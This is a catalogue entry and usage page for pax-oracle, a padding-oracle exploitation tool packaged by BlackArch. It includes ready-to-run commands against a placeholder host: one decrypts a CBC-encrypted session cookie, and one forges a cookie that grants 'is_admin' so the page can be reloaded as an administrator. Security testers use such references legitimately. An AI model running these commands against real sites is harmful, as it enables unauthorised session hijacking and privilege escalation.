---
name: "pax-oracle"
categories:
  - blackarch-crypto
version: "v0.2.2.r1.g38ac0d8"
homepage: "https://github.com/liamg/pax"
packaged-by: [blackarch]
blackarch-builddate: "2023-06-09"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "liamg/pax"
github-stars: 146
github-pushed: "2021-02-25"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pax-oracle

> CLI PKCS7 padding-oracle exploiter in Go with decrypt/encrypt subcommands: recovers plaintext of CBC-encrypted data, or produces ciphertext for arbitrary plaintext using the oracle's own algorithm.

## What it's for

pax (PAdding oracle eXploiter; packaged as pax-oracle so the binary does not collide with the POSIX pax archiver — upstream calls it `pax`) exploits a padding oracle to do two things: obtain the plaintext of a given piece of CBC-encrypted data, and obtain encrypted bytes for a chosen piece of plaintext without knowing the key. Each run takes a sample ciphertext the oracle already accepts, the block size, and how to reach the oracle (a URL plus any cookies the session needs). It is a sibling of padre and padbuster covering the same attack; unlike padre it needs the sample and block size supplied up front rather than auto-detected, and it predates padre by several years. Use it when the target is a straightforward cookie-or-parameter oracle and a small static binary is preferred.

## Typical use cases

### Decrypt a session cookie

```
pax-oracle decrypt --url https://target.example.com/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D"
```

Outcome: iterates candidate ciphertext blocks against the oracle and prints the recovered plaintext of the sample (e.g. a JSON session object); `--block-size 16` matches AES, `8` matches DES-family ciphers, and `--cookies` supplies the session each probe needs.

### Encrypt chosen plaintext through the oracle

```
pax-oracle encrypt --url https://target.example.com/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D" --plain-text '{"user_id": 456, "is_admin": true}'
```

Outcome: produces Base64 ciphertext that the oracle decrypts back to the supplied JSON — replace the cookie value with it and reload the page to test whether the application trusts forged session content.

*No corpus evidence — derived from upstream documentation.*
